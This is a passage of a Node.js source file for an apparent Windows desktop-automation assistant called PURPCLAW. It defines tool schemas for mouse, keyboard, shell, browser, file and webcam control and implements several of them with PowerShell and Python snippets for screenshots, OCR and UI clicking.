  { name: 'mouse_click', description: 'Click at coordinates. Supports left/right/double/drag.', inputSchema: { type: 'object', properties: { x: { type: 'number' }, y: { type: 'number' }, button: { type: 'string', enum: ['left', 'right', 'middle'] }, double: { type: 'boolean' }, drag_to_x: { type: 'number' }, drag_to_y: { type: 'number' } }, required: ['x', 'y'] } },
  { name: 'mouse_scroll', description: 'Scroll mouse wheel.', inputSchema: { type: 'object', properties: { direction: { type: 'string', enum: ['up', 'down'] }, amount: { type: 'number' }, x: { type: 'number' }, y: { type: 'number' } }, required: ['direction'] } },
  { name: 'keyboard_type', description: 'Type text or press shortcuts (ctrl+c, alt+f4, enter, etc).', inputSchema: { type: 'object', properties: { text: { type: 'string' }, shortcut: { type: 'string' } } } },
  { name: 'find_and_click', description: 'Find UI element by text label and click it.', inputSchema: { type: 'object', properties: { target: { type: 'string' }, click_type: { type: 'string', enum: ['left', 'right', 'double'] } }, required: ['target'] } },
  { name: 'window_list', description: 'List open windows.', inputSchema: { type: 'object', properties: { filter: { type: 'string' } } } },
  { name: 'window_focus', description: 'Focus a window by title.', inputSchema: { type: 'object', properties: { window_title: { type: 'string' } }, required: ['window_title'] } },
  { name: 'window_close', description: 'Close a window by title or active window.', inputSchema: { type: 'object', properties: { title: { type: 'string' } } } },
  { name: 'file_read', description: 'Read file contents.', inputSchema: { type: 'object', properties: { path: { type: 'string' }, max_lines: { type: 'number' } }, required: ['path'] } },
  { name: 'file_write', description: 'Write content to a file.', inputSchema: { type: 'object', properties: { path: { type: 'string' }, content: { type: 'string' }, append: { type: 'boolean' } }, required: ['path', 'content'] } },
  { name: 'file_list', description: 'List directory contents.', inputSchema: { type: 'object', properties: { path: { type: 'string' }, recursive: { type: 'boolean' } }, required: ['path'] } },
  { name: 'file_search', description: 'Search files by name or content.', inputSchema: { type: 'object', properties: { path: { type: 'string' }, query: { type: 'string' }, in_content: { type: 'boolean' } }, required: ['path', 'query'] } },
  { name: 'browser_open', description: 'Open URL in browser via Playwright.', inputSchema: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] } },
  { name: 'browser_click', description: 'Click a link, button, or element on the current page.', inputSchema: { type: 'object', properties: { target: { type: 'string' }, index: { type: 'number' } }, required: ['target'] } },
  { name: 'browser_type', description: 'Type text into a form field on the page.', inputSchema: { type: 'object', properties: { selector: { type: 'string' }, text: { type: 'string' }, submit: { type: 'boolean' } }, required: ['text'] } },
  { name: 'browser_scroll', description: 'Scroll the page up or down.', inputSchema: { type: 'object', properties: { direction: { type: 'string', enum: ['up', 'down'] }, amount: { type: 'number' } } } },
  { name: 'browser_get_content', description: 'Read the visible text content of the current page.', inputSchema: { type: 'object', properties: { selector: { type: 'string' }, max_length: { type: 'number' } } } },
  { name: 'browser_screenshot', description: 'Take a screenshot of the current browser page.', inputSchema: { type: 'object', properties: {} } },
  { name: 'browser_navigate', description: 'Navigate to URL in current tab, or go back/forward.', inputSchema: { type: 'object', properties: { url: { type: 'string' }, action: { type: 'string', enum: ['goto', 'back', 'forward', 'reload'] } } } },
  { name: 'browser_tabs', description: 'List open browser pages.', inputSchema: { type: 'object', properties: {} } },
  { name: 'browser_close_tab', description: 'Close a browser tab.', inputSchema: { type: 'object', properties: { index: { type: 'number' }, title: { type: 'string' } } } },
  { name: 'purpclaw_start', description: 'Start PURPCLAW AI build pipeline.', inputSchema: { type: 'object', properties: { task: { type: 'string' }, output_dir: { type: 'string' } }, required: ['task'] } },
  { name: 'purpclaw_stop', description: 'Stop running pipeline.', inputSchema: { type: 'object', properties: {} } },
  { name: 'purpclaw_status', description: 'Get pipeline status.', inputSchema: { type: 'object', properties: {} } },
  { name: 'purpclaw_logs', description: 'Get pipeline logs.', inputSchema: { type: 'object', properties: { lines: { type: 'number' } } } },
  { name: 'git_command', description: 'Run git commands.', inputSchema: { type: 'object', properties: { command: { type: 'string' }, cwd: { type: 'string' } }, required: ['command'] } },
  { name: 'http_request', description: 'Make HTTP requests.', inputSchema: { type: 'object', properties: { url: { type: 'string' }, method: { type: 'string', enum: ['GET', 'POST', 'PUT', 'DELETE'] }, body: { type: 'string' } }, required: ['url'] } },
  { name: 'clipboard', description: 'Read or write clipboard.', inputSchema: { type: 'object', properties: { action: { type: 'string', enum: ['read', 'write'] }, text: { type: 'string' } }, required: ['action'] } },
  { name: 'execute_command', description: 'Execute shell command.', inputSchema: { type: 'object', properties: { command: { type: 'string' }, cwd: { type: 'string' } }, required: ['command'] } },
  { name: 'open_application', description: 'Open app by name.', inputSchema: { type: 'object', properties: { app_name: { type: 'string' } }, required: ['app_name'] } },
  { name: 'speak', description: 'Speak via TTS.', inputSchema: { type: 'object', properties: { message: { type: 'string' } }, required: ['message'] } },
  { name: 'memory', description: 'Persistent memory (remember/recall/forget/list).', inputSchema: { type: 'object', properties: { action: { type: 'string', enum: ['remember', 'recall', 'forget', 'list'] }, content: { type: 'string' } }, required: ['action'] } },
  { name: 'notification', description: 'Desktop toast notification.', inputSchema: { type: 'object', properties: { title: { type: 'string' }, message: { type: 'string' } }, required: ['title', 'message'] } },
  { name: 'task_schedule', description: 'Schedule background task.', inputSchema: { type: 'object', properties: { description: { type: 'string' }, delay_seconds: { type: 'number' }, command: { type: 'string' } }, required: ['description', 'delay_seconds', 'command'] } },
  { name: 'task_list', description: 'List background tasks.', inputSchema: { type: 'object', properties: {} } },
  { name: 'webcam_look', description: 'Take a photo with the PC webcam.', inputSchema: { type: 'object', properties: { camera: { type: 'number' } } } },
  { name: 'webcam_detect', description: 'Detect people/faces/objects via webcam using YOLO.', inputSchema: { type: 'object', properties: { confidence: { type: 'number' }, camera: { type: 'number' } } } },
  { name: 'webcam_read', description: 'Read any text visible to the webcam using OCR.', inputSchema: { type: 'object', properties: { camera: { type: 'number' } } } },
  { name: 'file_copy', description: 'Copy a file or directory.', inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } }, required: ['source', 'destination'] } },
  { name: 'file_move', description: 'Move or rename a file/directory.', inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } }, required: ['source', 'destination'] } },
  { name: 'file_delete', description: 'Delete a file or empty directory.', inputSchema: { type: 'object', properties: { path: { type: 'string' } }, required: ['path'] } },
  { name: 'dir_create', description: 'Create a directory (and parents).', inputSchema: { type: 'object', properties: { path: { type: 'string' } }, required: ['path'] } },
  { name: 'download_file', description: 'Download a file from a URL to local path.', inputSchema: { type: 'object', properties: { url: { type: 'string' }, destination: { type: 'string' } }, required: ['url'] } },
  { name: 'process_list', description: 'List running processes. Filter by name.', inputSchema: { type: 'object', properties: { filter: { type: 'string' }, sort_by: { type: 'string', enum: ['mem', 'cpu', 'name'] } } } },
  { name: 'process_kill', description: 'Kill a process by name or PID.', inputSchema: { type: 'object', properties: { name: { type: 'string' }, pid: { type: 'number' } } } },
  { name: 'volume_control', description: 'Set system volume or mute/unmute.', inputSchema: { type: 'object', properties: { level: { type: 'number' }, action: { type: 'string', enum: ['set', 'mute', 'unmute', 'up', 'down'] } } } },
  { name: 'zip_create', description: 'Create a zip archive from files/folder.', inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } }, required: ['source', 'destination'] } },
  { name: 'zip_extract', description: 'Extract a zip archive.', inputSchema: { type: 'object', properties: { source: { type: 'string' }, destination: { type: 'string' } }, required: ['source'] } },
  { name: 'install_package', description: 'Install packages via pip, npm, or choco.', inputSchema: { type: 'object', properties: { manager: { type: 'string', enum: ['pip', 'npm', 'choco'] }, packages: { type: 'string' }, cwd: { type: 'string' } }, required: ['manager', 'packages'] } },
  { name: 'active_window', description: 'Get info about the currently focused window.', inputSchema: { type: 'object', properties: {} } },
  { name: 'system_status', description: 'PC health check (CPU, RAM, disk, processes).', inputSchema: { type: 'object', properties: {} } },
  { name: 'system_paths', description: 'Returns all standard Windows filesystem paths.', inputSchema: { type: 'object', properties: {} } },
  { name: 'disk_info', description: 'Get disk space info for all drives.', inputSchema: { type: 'object', properties: {} } },
  { name: 'network_info', description: 'Get IP addresses, WiFi status, internet connectivity.', inputSchema: { type: 'object', properties: {} } },
  { name: 'load_toolset', description: 'Switch the active toolset context.', inputSchema: { type: 'object', properties: { set: { type: 'string', enum: ['core', 'browser', 'files', 'os', 'webcam', 'all'] } }, required: ['set'] } },
  { name: 'get_weather', description: 'Get current weather for a location.', inputSchema: { type: 'object', properties: { location: { type: 'string' } } } },
  { name: 'search_music', description: 'Search for music tracks.', inputSchema: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] } },
  { name: 'play_music', description: 'Play music track or open music in browser.', inputSchema: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] } },
  { name: 'search_knowledge', description: 'Search Wikipedia and general knowledge.', inputSchema: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] } },
  { name: 'search_memory', description: 'Search the PURPCLAW memory store for information.', inputSchema: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] } }
];

const loadedSkills = {};
const CORE_PRESERVE = ['interactive_shell', 'skill_manager', 'task_manager', 'speak', 'memory', 'file_read', 'file_write', 'socket_rig', 'purpclaw_start', 'system_status', 'load_toolset', 'window_list'];
let ACTIVE_TOOLSET = 'all';

function loadDynamicSkills() {
  if (!fs.existsSync(SKILLS_DIR)) fs.mkdirSync(SKILLS_DIR, { recursive: true });
  const files = fs.readdirSync(SKILLS_DIR).filter(f => f.endsWith('.js') && !f.endsWith('.pending.js'));
  for (const file of files) {
    try {
      const fullPath = path.join(SKILLS_DIR, file);
      delete require.cache[require.resolve(fullPath)];
      const skillDef = require(fullPath);
      if (skillDef.name && skillDef.description && typeof skillDef.handler === 'function') {
        loadedSkills[skillDef.name] = skillDef.handler;
      }
    } catch (e) { console.error(`[SKILLS] Failed to load ${file}: ${e.message}`); }
  }
}

async function executeTool(name, args) {
  const t0 = Date.now();
  console.log(`[TOOL] ${name}`, JSON.stringify(args).substring(0, 120));

  const ebCalledPayload = JSON.stringify({ topic: 'tool.called', toolName: name, args });
  const ebCalledReq = http.request({ hostname: 'localhost', port: 7782, path: '/publish', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(ebCalledPayload) } }, () => {});
  ebCalledReq.on('error', () => {});
  ebCalledReq.write(ebCalledPayload);
  ebCalledReq.end();

  let result = null;
  if (loadedSkills[name]) {
    try {
      const res = await loadedSkills[name](args, { ps, psScript, cmd, ok, execAsync, config: { PURP_DIR, SKILLS_DIR } });
      console.log(`[TOOL] OK ${name} (${Date.now() - t0}ms)`);
      result = ok(res);
    } catch (e) { result = ok(`Dynamic Skill Error: ${e.message}`); }
  } else {
    try {
      result = await runTool(name, args);
      console.log(`[TOOL] OK ${name} (${Date.now() - t0}ms)`);
    } catch (e) { result = ok(`Error: ${e.message}`); }
  }

  const ebResultPayload = JSON.stringify({ topic: 'tool.result', toolName: name, duration: Date.now() - t0 });
  const ebResultReq = http.request({ hostname: 'localhost', port: 7782, path: '/publish', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(ebResultPayload) } }, () => {});
  ebResultReq.on('error', () => {});
  ebResultReq.write(ebResultPayload);
  ebResultReq.end();

  return result;
}

async function runTool(name, args) {
  switch (name) {
    case 'load_toolset': {
      const allowed = ['core', 'browser', 'files', 'os', 'webcam', 'all'];
      const ns = args.set.toLowerCase();
      if (!allowed.includes(ns)) return ok(`Invalid set. Use: ${allowed.join(', ')}`);
      ACTIVE_TOOLSET = ns;
      loadDynamicSkills();
      return ok(`Switched tool context to '${ns}'`);
    }
    case 'screen_capture': {
      const outPath = path.join(os.tmpdir(), `screen_${Date.now()}.png`).replace(/\\/g, '\\\\');
      const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bmp.Save("${outPath}")
$gfx.Dispose()
$bmp.Dispose()
Write-Output "Screenshot saved: ${outPath} ($($screen.Width)x$($screen.Height))"
`, 10000);
      return ok(r);
    }
    case 'screen_ocr':
    case 'ocr_identify': {
      const img = args.image_path || path.join(os.tmpdir(), `ocr_${Date.now()}.png`);
      const pyScript = `
import mss, mss.tools, pytesseract, json
pytesseract.pytesseract.tesseract_cmd = r'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
from PIL import Image
${!args.image_path ? `
with mss.mss() as sct:
    shot = sct.grab(sct.monitors[1])
    mss.tools.to_png(shot.rgb, shot.size, output=r"${img}")
` : ''}
img = Image.open(r"${img}")
# Use LSTM OCR engine (oem=3) with uniform text block (psm=6)
text = pytesseract.image_to_string(img, config='--oem 3 --psm 6').strip()
# Also get structured data with bounding boxes
data = pytesseract.image_to_data(img, config='--oem 3 --psm 6', output_type=pytesseract.Output.DICT)
lines = []
current_line = []
current_y = -1
for i, txt in enumerate(data['text']):
    if txt.strip():
        if current_y > 0 and abs(data['top'][i] - current_y) > 15:
            if current_line:
                lines.append(' '.join(current_line))
            current_line = []
        current_line.append(txt)
        current_y = data['top'][i]
if current_line:
    lines.append(' '.join(current_line))
full_text = '\\n'.join(lines)
word_count = len([w for w in data['text'] if w.strip()])
print(json.dumps({"text": full_text, "raw_text": text, "words": word_count, "lines": len(lines)}, ensure_ascii=False))
`;
      const tmp = path.join(os.tmpdir(), `ocr_${Date.now()}.py`);
      fs.writeFileSync(tmp, pyScript);
      const r = await execAsync(`py -3.11 "${tmp}"`, { timeout: 30000 }).catch(e => ({ stdout: `Error: ${e.message}` }));
      try { fs.unlinkSync(tmp); } catch (e) {}
      try {
        const data = JSON.parse(r.stdout.trim().split('\n').pop());
        const prefix = data.lines > 5 ? `[SCREEN - ${data.lines} lines, ${data.words} words]\n` : `[SCREEN - ${data.words} words]\n`;
        return ok(prefix + data.text);
      } catch (e) { return ok(r.stdout || 'OCR failed - no text detected'); }
    }
    case 'screen_find_object': {
      const isUserPath = !!args.image_path;
      const imgPathRaw = args.image_path || path.join(os.tmpdir(), `det_${Date.now()}.png`);
      const imgPathEscaped = imgPathRaw.replace(/\\/g, '\\\\');
      if (!isUserPath) {
        await psScript(`
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$b=New-Object Drawing.Bitmap($s.Width,$s.Height)
$g=[Drawing.Graphics]::FromImage($b)
$g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size)
$b.Save("${imgPathEscaped}")
$g.Dispose();$b.Dispose()
`, 10000);
      }
      // Use YOLO service on port 7779 for cached model (use raw path, not escaped)
      const confidence = args.confidence || 0.5;
      const body = JSON.stringify({ image: imgPathRaw, confidence });
      const postData = Buffer.from(body);
      const yoloReq = await new Promise((resolve) => {
        const options = {
          hostname: '127.0.0.1',
          port: 7779,
          path: '/detect',
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length }
        };
        const yoloConn = http.request(options, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve(data));
        });
        yoloConn.on('error', () => resolve(null));
        yoloConn.write(postData);
        yoloConn.end();
      }).catch(() => null);
      if (!yoloReq) return ok('YOLO service unavailable - ensure yolo_service.py is running');
      try {
        const result = JSON.parse(yoloReq);
        if (!result.success) return ok(`Detection error: ${result.error}`);
        const objs = result.objects.map(o => `${o.class} (${(o.conf*100).toFixed(0)}%) at (${o.center[0]},${o.center[1]})`).join(', ');
        return ok(result.count === 0 ? 'No objects detected' : `${result.count} objects: ${objs}`);
      } catch { return ok(yoloReq || 'Detection failed'); }
    }
    case 'screen_identify': {
      // Combined: capture + OCR + object detection for full screen understanding
      const imgPath = path.join(os.tmpdir(), `identify_${Date.now()}.png`).replace(/\\/g, '\\\\');
      const imgPathRaw = path.join(os.tmpdir(), `identify_${Date.now()}.png`);
      await psScript(`
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$b=New-Object Drawing.Bitmap($s.Width,$s.Height)
$g=[Drawing.Graphics]::FromImage($b)
$g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size)
$b.Save("${imgPath}")
$g.Dispose();$b.Dispose()
`, 10000);
      // OCR with inline Python (fast), YOLO via service (cached model)
      const pyScript = `
import pytesseract, json
from PIL import Image
pytesseract.pytesseract.tesseract_cmd = r'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
img = Image.open(r"${imgPath}")
data = pytesseract.image_to_data(img, config='--oem 3 --psm 6', output_type=pytesseract.Output.DICT)
lines_dict = {}
for i, txt in enumerate(data['text']):
    if txt.strip():
        line_idx = round(data['top'][i] / 20)
        if line_idx not in lines_dict:
            lines_dict[line_idx] = []
        lines_dict[line_idx].append(txt)
lines = [' '.join(lines_dict[k]) for k in sorted(lines_dict.keys())]
text = '\\n'.join(lines)
print(json.dumps({"text": text[:3000], "word_count": len([w for w in data['text'] if w.strip()]), "line_count": len(lines)}, ensure_ascii=False))
`;
      const tmp = path.join(os.tmpdir(), `identify_${Date.now()}.py`);
      fs.writeFileSync(tmp, pyScript);
      const r = await execAsync(`py -3.11 "${tmp}"`, { timeout: 30000 }).catch(e => ({ stdout: `Error: ${e.message}` }));
      try { fs.unlinkSync(tmp); } catch (e) {}
      // YOLO detection via service (using raw path without escaping)
      const body = JSON.stringify({ image: imgPathRaw, confidence: 0.4 });
      const postData = Buffer.from(body);
      const yoloReq = await new Promise((resolve) => {
        const options = {
          hostname: '127.0.0.1',
          port: 7779,
          path: '/detect',
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length }
        };
        const yoloConn = http.request(options, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve(data));
        });
        yoloConn.on('error', () => resolve(null));
        yoloConn.write(postData);
        yoloConn.end();
      }).catch(() => null);
      try {
        const d = JSON.parse(r.stdout.trim().split('\n').pop());
        const objPart = yoloReq ? (() => {
          try {
            const yoloResult = JSON.parse(yoloReq);
            if (!yoloResult.success) return 'none';
            const objects = yoloResult.objects.map(o => `${o.class} (${(o.conf*100).toFixed(0)}%)`);
            return objects.length ? objects.join(', ') : 'none';
          } catch { return 'none'; }
        })() : 'none';
        const out = `[VISION - ${d.line_count} lines, ${d.word_count} words, ${yoloReq ? JSON.parse(yoloReq).count || 0 : 0} objects detected]\n`;
        const objLine = objPart !== 'none' ? `\n[OBJECTS: ${objPart}]\n` : '\n';
        const textPart = d.text ? `\n[TEXT]\n${d.text}` : '\n[No text detected]';
        return ok(out + objLine + textPart);
      } catch (e) { return ok(r.stdout || 'Screen identify failed'); }
    }
    case 'screen_find_template': { return ok('Template matching: use screen_capture first, then provide template_path'); }
    case 'screen_info': {
      const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
$i = 0
foreach($m in [System.Windows.Forms.Screen]::AllScreens) {
  Write-Output "Monitor $i: $($m.Bounds.Width)x$($m.Bounds.Height) at ($($m.Bounds.X),$($m.Bounds.Y)) $(if($m.Primary){'[PRIMARY]'})"
  $i++
}
`, 5000);
      return ok(r);
    }
    case 'mouse_click': {
      const x = coord(args.x), y = coord(args.y);
      const btn = args.button || 'left';
      const dn = btn === 'right' ? 8 : btn === 'middle' ? 32 : 2;
      const up = btn === 'right' ? 16 : btn === 'middle' ? 64 : 4;
      if (args.drag_to_x !== undefined) {
        const dx = coord(args.drag_to_x), dy = coord(args.drag_to_y);
        const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);' -Name U -Namespace W
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x},${y})
Start-Sleep -Milliseconds 50
[W.U]::mouse_event(2,0,0,0,0)
Start-Sleep -Milliseconds 50
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${dx},${dy})
Start-Sleep -Milliseconds 50
[W.U]::mouse_event(4,0,0,0,0)
Write-Output "Dragged (${x},${y}) to (${dx},${dy})"
`, 5000);
        return ok(r);
      }
      const dblCode = args.double ? `[W.U]::mouse_event(${dn},0,0,0,0);[W.U]::mouse_event(${up},0,0,0,0)\nStart-Sleep -Milliseconds 50\n[W.U]::mouse_event(${dn},0,0,0,0);[W.U]::mouse_event(${up},0,0,0,0)` : `[W.U]::mouse_event(${dn},0,0,0,0);[W.U]::mouse_event(${up},0,0,0,0)`;
      const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);' -Name U -Namespace W
[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${x},${y})
Start-Sleep -Milliseconds 50
${dblCode}
Write-Output "${args.double?'Double-':''}${btn}-clicked (${x},${y})"
`, 5000);
      return ok(r);
    }
    case 'mouse_scroll': {
      const sv = (args.direction === 'up' ? 120 : -120) * (args.amount || 3);
      let moveCode = '';
      if (args.x !== undefined) moveCode = `Add-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${coord(args.x)},${coord(args.y)})\nStart-Sleep -Milliseconds 50`;
      const r = await psScript(`
${moveCode}
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);' -Name U -Namespace W
[W.U]::mouse_event(0x0800,0,0,${sv},0)
Write-Output "Scrolled ${args.direction} ${args.amount || 3}"
`, 5000);
      return ok(r);
    }
    case 'keyboard_type': {
      if (args.shortcut) {
        const km = { 'ctrl+c': '^c', 'ctrl+v': '^v', 'ctrl+x': '^x', 'ctrl+z': '^z', 'ctrl+a': '^a', 'ctrl+s': '^s', 'ctrl+w': '^w', 'ctrl+t': '^t', 'ctrl+n': '^n', 'ctrl+l': '^l', 'ctrl+shift+t': '^+t', 'ctrl+shift+n': '^+n', 'alt+f4': '%{F4}', 'alt+tab': '%{TAB}', 'enter': '{ENTER}', 'escape': '{ESC}', 'esc': '{ESC}', 'tab': '{TAB}', 'backspace': '{BACKSPACE}', 'delete': '{DELETE}', 'up': '{UP}', 'down': '{DOWN}', 'left': '{LEFT}', 'right': '{RIGHT}', 'home': '{HOME}', 'end': '{END}', 'pageup': '{PGUP}', 'pagedown': '{PGDN}', 'f1': '{F1}', 'f2': '{F2}', 'f3': '{F3}', 'f4': '{F4}', 'f5': '{F5}', 'f11': '{F11}', 'f12': '{F12}', 'print_screen': '{PRTSC}' };
        const k = km[args.shortcut.toLowerCase()] || args.shortcut;
        const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('${k}')
Write-Output "Pressed: ${args.shortcut}"
`, 5000);
        return ok(r);
      }
      if (args.text) {
        const safe = san(args.text);
        const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('${safe}')
Write-Output "Typed ${safe.length} chars"
`, 5000);
        return ok(r);
      }
      return ok('Specify text or shortcut');
    }
    case 'find_and_click': {
      const target = san(args.target || '');
      const ce = (args.click_type || 'left') === 'right' ? '[W.U]::mouse_event(8,0,0,0,0);[W.U]::mouse_event(16,0,0,0,0)' : (args.click_type || 'left') === 'double' ? '[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0);Start-Sleep -ms 50;[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0)' : '[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0)';
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);' -Name U -Namespace W
$root = [System.Windows.Automation.AutomationElement]::RootElement
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::IsEnabledProperty, $true)
$target = '${target}'
$found = $false
$els = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
foreach ($el in $els) {
  try {
    $n = $el.Current.Name
    $t = $el.Current.ControlType.ProgrammaticName
    if ($n -like "*$target*") {
      $r = $el.Current.BoundingRectangle
      if ($r.Width -gt 0 -and $r.Height -gt 0) {
        $cx = [int]($r.X + $r.Width / 2)
        $cy = [int]($r.Y + $r.Height / 2)
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($cx, $cy)
        Start-Sleep -Milliseconds 100
        ${ce}
        Write-Output "CLICKED: '$n' ($t) at ($cx,$cy)"
        $found = $true; break
      }
    }
  } catch { continue }
}
if (-not $found) {
  $vis = @()
  foreach ($el in $els) {
    try {
      $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
      if ($n -and $n.Length -gt 0 -and $n.Length -lt 60 -and $t -match 'Button|MenuItem|TabItem|Hyperlink|ListItem') {
        $r = $el.Current.BoundingRectangle
        if ($r.Width -gt 0) { $vis += "$t : '$n'" }
      }
    } catch { continue }
  }
  Write-Output "NOT FOUND: '$target'"
  $vis | Select-Object -First 20 | ForEach-Object { Write-Output $_ }
}
`, 20000);
      return ok(r);
    }
    case 'window_list': {
      const filter = args.filter ? ` | Where-Object {$_.MainWindowTitle -like '*${san(args.filter)}*'}` : '';
      const r = await ps(`Get-Process${filter} | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object -Property Name,MainWindowTitle,Id | Format-Table -AutoSize | Out-String`, 8000);
      return ok(r || 'No windows found');
    }
    case 'window_focus': {
      const r = await psScript(`
Add-Type @'
using System;using System.Runtime.InteropServices;
public class WF{
  [DllImport("user32.dll")]public static extern bool SetForegroundWindow(IntPtr h);
  [DllImport("user32.dll")]public static extern bool ShowWindowAsync(IntPtr h,int c);
}
'@
$p = Get-Process | Where-Object {$_.MainWindowTitle -like '*${san(args.window_title)}*'} | Select-Object -First 1
if ($p) {
  [WF]::ShowWindowAsync($p.MainWindowHandle,1) | Out-Null
  [WF]::SetForegroundWindow($p.MainWindowHandle) | Out-Null
  Write-Output "Focused: $($p.MainWindowTitle)"
} else { Write-Output "Not found: ${san(args.window_title)}" }
`, 8000);
      return ok(r);
    }
    case 'window_close': {
      const t = san(args.title || '');
      if (t) {
        const r = await ps(`$p=Get-Process|Where-Object{$_.MainWindowTitle -like '*${t}*'}|Select-Object -First 1;if($p){$p.CloseMainWindow()|Out-Null;Write-Output ('Closed: '+$p.MainWindowTitle)}else{Write-Output 'Not found'}`, 8000);
        return ok(r);
      }
      const r = await psScript(`
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('%{F4}')
Write-Output "Alt+F4 sent"
`, 5000);
      return ok(r);
    }
    case 'ui_list_elements': {
      // List ALL interactive UI elements across all windows
      const filter = san(args.filter || '');
      const max = args.max_results || 100;
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes, System.Windows.Forms
$root = [System.Windows.Automation.AutomationElement]::RootElement
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::IsEnabledProperty, $true)
$els = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
$types = 'Button','MenuItem','TabItem','Hyperlink','ListItem','Edit','ComboBox','Slider','RadioButton','CheckBox','TreeItem','Document','Text','Group','Image','Custom'
$filter = '${filter}'
$results = @()
foreach ($el in $els) {
  try {
    $n = $el.Current.Name; $t = $el.Current.ControlType.ProgrammaticName
    $wn = $el.Current.ProcessName
    $r2 = $el.Current.BoundingRectangle
    if ($n -and $r2.Width -gt 0 -and $r2.Height -gt 0) {
      $typeMatch = $types | Where-Object { $t -match $_ }
      $nameMatch = !$filter -or ($n -like "*$filter*" -or $wn -like "*$filter*")
      if ($typeMatch -and $nameMatch) {
        $results += [PSCustomObject]@{
          Name = $n.Substring(0, [Math]::Min($n.Length, 60))
          Type = $t -replace 'ControlType.',''
          Window = $wn
          X = $r2.X; Y = $r2.Y
          W = $r2.Width; H = $r2.Height
          CX = [int]($r2.X + $r2.Width/2)
          CY = [int]($r2.Y + $r2.Height/2)
        }
      }
    }
  } catch { continue }
}
$results | Select-Object -First ${max} | Format-Table -AutoSize | Out-String
`, 15000);
      return ok(r || 'No elements found');
    }
    case 'ui_click_element': {
      const target = san(args.name || '');
      const btn = args.button || 'left';
      const ce = btn === 'right' ? '[W.U]::mouse_event(8,0,0,0,0);[W.U]::mouse_event(16,0,0,0,0)' : btn === 'double' ? '[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0);Start-Sleep -ms 50;[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0)' : '[W.U]::mouse_event(2,0,0,0,0);[W.U]::mouse_event(4,0,0,0,0)';
      const r = await psScript(`
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes, System.Windows.Forms
Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern void mouse_event(int f,int x,int y,int d,int i);[DllImport("user32.dll")]public static extern bool SetForegroundWindow(IntPtr h);' -Name U -Namespace W
$target = '${target}'
$types = 'Button','MenuItem','TabItem','Hyperlink','ListItem','Edit','ComboBox','Slider','RadioButton','CheckBox','TreeItem','Document','Group','Custom'
$root = [System.Windows.Automation.AutomationElement]::RootElement
$cond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::IsEnabledProperty, $true)
$els = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, $cond)
